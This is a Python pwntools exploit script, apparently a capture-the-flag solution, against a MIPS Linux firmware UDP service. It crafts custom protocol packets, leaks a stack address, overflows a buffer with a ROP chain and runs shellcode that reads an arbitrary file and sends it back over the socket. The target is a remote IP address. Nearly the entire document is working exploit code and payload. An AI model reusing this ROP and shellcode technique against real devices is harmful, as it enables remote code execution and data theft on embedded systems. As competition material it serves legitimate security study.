from pwn import *
import base64

context.update(arch="mips", endian='big', os="linux")

fd = 3

context.log_level = 'info'
# shellcode that reuse the udp socket to receive filename, open it, read it, and use sento on udp socket to exfiltrate it
shellc = asm ('''
   /* recvfrom */
    li $v0,4176
    li $a0, %d
    add $a1,$sp,-1024
    li $a2,0x100
    move $a3,$zero

    add $s0,$sp,-1048
    sw $s0,16($sp)
    add $s0,$sp,-1072
    sw $s0,20($sp)
    syscall 0x040405
    nop

    li $v0,4005
    add $a0,$sp,-1024
    move $a1,$zero
    syscall 0x040405
    nop

    add $a0,$zero,$v0
    add $a1,$sp,-16384
    li $a2,8192
    li $v0,4003
    syscall 0x040405
    nop
    add $a1,$sp,-16384
    add $a2,$zero,$v0

   /* sendto */
   li $v0,4180
   li $a0, 3
   move $a3,$zero
   add $s0,$sp,-1048
   sw $s0,16($sp)
   li  $s0,0x10
   sw $s0,20($sp)
   syscall 0x040405
   nop
''' % fd)

context.log_level = 'debug'

if args.REMOTE:
  p = connect('47.89.210.186', 57798)
  p.sendlineafter('now:\n', 'qwkQZgWBSaq3jepFDsHf2A==')
  p.recvuntil('port is : ', drop=True)
  port = int( p.recvuntil(' ', drop=True),10)
  print('waiting...')
  sleep(40)
  print('trying...')
else:
  port = 62721

if args.REMOTE:
  r = connect('47.89.210.186', port, typ="udp")
else:
  r = connect('127.0.0.1', port, typ="udp")
#  r = connect('47.89.210.186', 31761, typ="udp")

pkt = bytearray()
pkt += b'FIVI'
pkt += b'COCK'
# 8
pkt += b'\x0a'
# 9: opcode? 1 => read, 2 => write
pkt += b'\x01\x00'
# 11: idk
pkt += bytes(2)
# 13: ifaddr
pkt += bytes(4)
# 17: mac addr of device
pkt += b'\xff' * 6
# 23: no clue
pkt += bytes(2)
# 25: payload len?
pkt += bytes(4)
r.send(pkt)
resp = r.recvn(541)
remote_mac = resp[17:][:6]
remote_ifaddr = u32(resp[13:17], endian='big')
log.info('remote_mac: %s', remote_mac.hex())
log.info('remote_ifaddr: 0x%08x', remote_ifaddr)


pkt = bytearray()
pkt += b'FIVI'
pkt += b'COCK'
# 8
pkt += b'\x0a'
# 9: opcode? 1 => read, 2 => write
pkt += b'\x02\x00'
# 11: idk
pkt += bytes(2)
# 13: ifaddr
pkt += p32(remote_ifaddr, endian='big')
# 17: mac addr of device
pkt += remote_mac
# 23: no clue
pkt += bytes(2)
# 25: payload len?
pkt += p32(0x8E, endian='little')

'''
returning of sub_400f50
(dont forget in mips instruction after jr is executed too)

text:00401078                 move    $v0, $s0
.text:0040107C                 lw      $ra, 0x35C+var_s8($sp)
.text:00401080                 lw      $s1, 0x35C+var_s4($sp)
.text:00401084                 lw      $s0, 0x35C+var_s0($sp)
.text:00401088                 jr      $ra
.text:0040108C                 addiu   $sp, 0x368
'''


gadget1 = 0x0400F3C	# set $a1
gadget2 = 0x04020B0	# move    $a0, $s0    
gadget3 = 0x00401078 # move $v0, $s0; lw $ra, 0x364($sp); lw $s1, 0x360($sp); lw $s0, 0x35c($sp); jr $ra; addiu $sp, $sp, 0x368;
gadget3b = 0x4010fc
gadget4 = 0x00400ca0 # lw $ra, 0x1c($sp); jr $ra; addiu $sp, $sp, 0x20;
gadget5 = 0x00401720 # lw $s0, 0x48($sp); jr $ra; addiu $sp, $sp, 0x58;
syscall = 0x4001d8


payload1 = b'pipo'

payload2 = p32(0xdeadbeef)*145
payload2 += p32(3)		# $s0
payload2 += p32(0x413138)		# $s1 
payload2 += p32(0x4016ec)	# $ra
payload2 += p32(0)*4+p32(0x413170)+p32(0x10)+p32(0x41b030)
payload2 += p32(0)*11+p32(fd)+p32(1)+p32(1)+p32(gadget2)

payload2 += b'\x00'*0x7c + p32(0x413138 - 0x11)+p32(0)+p32(0x400f3c)

payload2 += b'\x00'*0x20+p32(0x413134)+p32(0x4016b4)

payload2 += p32(0)*4+p32(0x413170)+p32(0x10)+p32(0x41b030) +p32(0)*11+p32(0x413400)+p32(0x413400)+p32(0x413134)+p32(0x402410)

payload2 += p32(0)*4+p32(0x413170)+p32(0x10)+p32(0x41b030)


pkt += base64.b64encode(payload1).ljust(64,b'\x00')
pkt += base64.b64encode(payload2)

r.send(pkt)
buff = r.recv(0x1d)
print(hexdump(buff))

stack = u32(buff[0:4])
print('stack leak = '+hex(stack))

pkt = bytearray()
pkt += b'FIVI'
pkt += b'COCK'
# 8
pkt += b'\x0a'
# 9: opcode? 1 => read, 2 => write
pkt += b'\x02\x00'
# 11: idk
pkt += bytes(2)
# 13: ifaddr
pkt += p32(remote_ifaddr, endian='big')
# 17: mac addr of device
pkt += remote_mac
# 23: no clue
pkt += bytes(2)
# 25: payload len?
pkt += p32(0x8E, endian='little')

payload2 = p32(0xdeadbeef)*145
payload2 += p32(3)              # $s0
payload2 += p32(0x413138)               # $s1 
payload2 += p32( (stack - 0xe00) & 0xfffffff0)       # $ra
payload2 += p32(0)*128 + shellc

pkt += base64.b64encode(payload1).ljust(64,b'\x00')
pkt += base64.b64encode(payload2)


r.send(pkt)
sleep(0.2)
r.send('/firmadyne/flag\x00')
while True:
  print(r.recv())

r.interactive()
